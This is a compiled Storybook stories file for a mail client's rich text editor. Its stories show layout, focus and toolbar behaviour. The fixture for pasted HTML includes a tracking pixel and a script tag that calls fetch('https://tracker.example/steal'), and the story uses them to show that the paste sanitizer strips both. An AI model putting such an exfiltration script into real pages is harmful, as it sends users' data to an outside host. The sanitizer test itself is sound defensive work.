import{j as d}from"./iframe-uTafckjr.js";import{C as b,s as y}from"./rich-text-document-BuK3ZpQ5.js";import{R as w}from"./rich-text-editor-CtQLlNf_.js";import"./preload-helper-PPVm8Dsz.js";import"./cn-BnS_VibS.js";import"./bundle-mjs-DeRmtv56.js";import"./button-DCXIHjmE.js";import"./purify.es-2FREwzWT.js";import"./index-DI-IM0Ba.js";import"./index-DN3_ZXiR.js";import"./createLucideIcon-DLYy-DY-.js";import"./undo-2-BTY7r3H6.js";const{expect:r,userEvent:T}=__STORYBOOK_MODULE_TEST__,_={title:"Mail/RichTextEditor",component:w,parameters:{layout:"centered",docs:{description:{component:`The frame is the compose body region at its real geometry — a column with a
height of its own — so the editor is shown claiming the space a composer
gives it rather than only the space its own text needs.`}}},decorators:[e=>d.jsx("div",{"data-testid":"body-area",className:"flex h-[420px] w-[640px] flex-col overflow-auto rounded-md border border-line bg-canvas",children:d.jsx(e,{})})]},p=["<h2>Quarterly numbers</h2>","<p>Highlights <strong>this quarter</strong>, with the detail below.</p>","<ul><li>Revenue up 14%</li><li>Costs flat</li></ul>","<table><thead><tr><th>Region</th><th>Total</th></tr></thead>","<tbody><tr><td>EMEA</td><td>412</td></tr>","<tr><td>Americas</td><td>388</td></tr></tbody></table>",'<p>Source: <a href="https://example.com/report">the full report</a>.</p>'].join(""),f=['<meta charset="utf-8">',"<!--[if gte mso 9]><xml><w:WordDocument/></xml><![endif]-->","<style>.hdr{color:#c00}</style>",'<h3 class="hdr" style="color:#c00;font-family:Verdana">Release checklist</h3>','<ol><li style="margin:0">Cut the tag</li><li>Publish the images</li></ol>','<table style="border:2px dashed #c00"><tbody>',"<tr><th>Step</th><th>Owner</th></tr>","<tr><td>Tag</td><td>Ada</td></tr></tbody></table>",'<img src="http://tracker.example/px.gif" width="1" height="1">','<script>fetch("https://tracker.example/steal")<\/script>'].join(""),m={name:"Empty",args:{}},h={name:"Rich content with a table",args:{initialHtml:p}},n={name:"After pasting a web page",args:{initialHtml:y(f)}},s={name:"Clicking below the last line",args:{initialHtml:"<p>Sounds good. See you at 12:30.</p>"},play:async({canvasElement:e})=>{const o=e.querySelector("[data-testid=body-area]"),t=e.querySelector("[data-testid=compose-body]");if(!o||!t)throw new Error("the editor is not mounted");const a=o.getBoundingClientRect(),u=document.elementFromPoint(a.left+a.width/2,Math.min(a.bottom-12,window.innerHeight-2));await r(t.contains(u)).toBe(!0),await T.click(t),await r(t).toHaveFocus()}},g=d.jsx(b,{mode:"rich",onToggle:()=>{}}),i={name:"Toolbar with the mode toggle",args:{initialHtml:p,trailing:g}},l={name:"Toolbar at 390",args:{initialHtml:p,trailing:g},decorators:[e=>d.jsx("div",{"data-testid":"body-area",className:"flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas",children:d.jsx(e,{})})],play:async({canvasElement:e})=>{const o=e.querySelector("[data-testid=body-area]"),t=e.querySelector("[data-testid=compose-format-cluster]"),a=e.querySelector("[data-testid=compose-mode-toggle]");if(!o||!t||!a)throw new Error("the toolbar is not mounted");await r(t.scrollWidth).toBeGreaterThan(t.clientWidth),await r(a.getBoundingClientRect().right).toBeLessThanOrEqual(o.getBoundingClientRect().right+1)}},c={name:"Toolbar over a scrolled body",args:{initialHtml:`${p}${"<p>Another line of the message.</p>".repeat(30)}`,trailing:g},play:async({canvasElement:e})=>{const o=e.querySelector("[data-testid=body-area]"),t=e.querySelector("[data-testid=compose-mode-toggle]");if(!o||!t)throw new Error("the toolbar is not mounted");o.scrollTop=400,await r(o.scrollTop).toBeGreaterThan(0),await r(t.getBoundingClientRect().top-o.getBoundingClientRect().top).toBeLessThan(60)}};m.parameters={...m.parameters,docs:{...m.parameters?.docs,source:{originalSource:`{
  name: "Empty",
  args: {}
}`,...m.parameters?.docs?.source}}};h.parameters={...h.parameters,docs:{...h.parameters?.docs,source:{originalSource:`{
  name: "Rich content with a table",
  args: {
    initialHtml: RICH_DOCUMENT
  }
}`,...h.parameters?.docs?.source}}};n.parameters={...n.parameters,docs:{...n.parameters?.docs,source:{originalSource:`{
  name: "After pasting a web page",
  args: {
    initialHtml: sanitizeAdoptedHtml(CLIPBOARD_HTML)
  }
}`,...n.parameters?.docs?.source},description:{story:`The document after that clipboard has gone through the paste profile: the
heading, the list and the table survive; the styling, the pixel and the
script do not.`,...n.parameters?.docs?.description}}};s.parameters={...s.parameters,docs:{...s.parameters?.docs,source:{originalSource:`{
  name: "Clicking below the last line",
  args: {
    initialHtml: "<p>Sounds good. See you at 12:30.</p>"
  },
  play: async ({
    canvasElement
  }) => {
    const area = canvasElement.querySelector<HTMLElement>("[data-testid=body-area]");
    const editable = canvasElement.querySelector<HTMLElement>("[data-testid=compose-body]");
    if (!area || !editable) throw new Error("the editor is not mounted");
    const box = area.getBoundingClientRect();
    const underTheText = document.elementFromPoint(box.left + box.width / 2, Math.min(box.bottom - 12, window.innerHeight - 2));
    await expect(editable.contains(underTheText)).toBe(true);
    await userEvent.click(editable);
    await expect(editable).toHaveFocus();
  }
}`,...s.parameters?.docs?.source},description:{story:`A short message leaves most of the body region empty. That region belongs to
the document: the point far below the last line is the editable, and a click
there lands in it.`,...s.parameters?.docs?.description}}};i.parameters={...i.parameters,docs:{...i.parameters?.docs,source:{originalSource:`{
  name: "Toolbar with the mode toggle",
  args: {
    initialHtml: RICH_DOCUMENT,
    trailing: modeToggle
  }
}`,...i.parameters?.docs?.source},description:{story:"The toolbar as compose ships it: the formatting cluster, then the mode.",...i.parameters?.docs?.description}}};l.parameters={...l.parameters,docs:{...l.parameters?.docs,source:{originalSource:`{
  name: "Toolbar at 390",
  args: {
    initialHtml: RICH_DOCUMENT,
    trailing: modeToggle
  },
  decorators: [Story => <div data-testid="body-area" className="flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas">
                <Story />
            </div>],
  play: async ({
    canvasElement
  }) => {
    const frame = canvasElement.querySelector<HTMLElement>("[data-testid=body-area]");
    const cluster = canvasElement.querySelector<HTMLElement>("[data-testid=compose-format-cluster]");
    const toggle = canvasElement.querySelector<HTMLElement>("[data-testid=compose-mode-toggle]");
    if (!frame || !cluster || !toggle) throw new Error("the toolbar is not mounted");
    await expect(cluster.scrollWidth).toBeGreaterThan(cluster.clientWidth);
    await expect(toggle.getBoundingClientRect().right).toBeLessThanOrEqual(frame.getBoundingClientRect().right + 1);
  }
}`,...l.parameters?.docs?.source},description:{story:`At 390 the formatting cluster runs out of room. It scrolls inside its own
strip and the toggle stays pinned at the right edge, rather than the cluster
pushing the toggle off the screen — which is what a flex child without
\`min-w-0\` does.`,...l.parameters?.docs?.description}}};c.parameters={...c.parameters,docs:{...c.parameters?.docs,source:{originalSource:`{
  name: "Toolbar over a scrolled body",
  args: {
    initialHtml: \`\${RICH_DOCUMENT}\${"<p>Another line of the message.</p>".repeat(30)}\`,
    trailing: modeToggle
  },
  play: async ({
    canvasElement
  }) => {
    const frame = canvasElement.querySelector<HTMLElement>("[data-testid=body-area]");
    const toggle = canvasElement.querySelector<HTMLElement>("[data-testid=compose-mode-toggle]");
    if (!frame || !toggle) throw new Error("the toolbar is not mounted");
    frame.scrollTop = 400;
    await expect(frame.scrollTop).toBeGreaterThan(0);
    await expect(toggle.getBoundingClientRect().top - frame.getBoundingClientRect().top).toBeLessThan(60);
  }
}`,...c.parameters?.docs?.source},description:{story:`The toolbar and the body share one scroller, so twenty lines of typing would
carry the toolbar off the top with them. It stays at the top of the body
while the text moves under it.`,...c.parameters?.docs?.description}}};const A=["Empty","RichContent","PasteResult","ClickBelowTheText","ToolbarInRich","NarrowToolbar","StickyToolbar"];export{s as ClickBelowTheText,m as Empty,l as NarrowToolbar,n as PasteResult,h as RichContent,c as StickyToolbar,i as ToolbarInRich,A as __namedExportsOrder,_ as default};
